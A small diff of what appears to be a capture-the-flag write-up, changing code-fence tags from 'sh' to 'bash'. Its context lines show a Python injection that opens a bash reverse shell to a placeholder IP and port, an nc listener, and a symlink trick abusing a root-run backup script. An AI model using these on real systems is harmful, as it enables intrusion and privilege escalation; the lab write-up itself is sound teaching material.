@@ -60,7 +60,7 @@ __import__('os').system('bash -c \'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\'')#
 Substitute the IP and the port.
 On your machine run:
 
-```sh
+```bash
 nc -nvlp <PORT>
 ```
 
@@ -139,7 +139,7 @@ There is a custom script called `backup` in `/usr/bin` that we can execute.
 It copies everything inside the reports folder of gordon to the backups folder.
 This action is made as root, so we can add a symlink to the root folder and make it copy also that.
 
-```sh
+```bash
 #!/bin/bash
 cd /home/gordon/reports/
 cp * /home/gordon/backups/
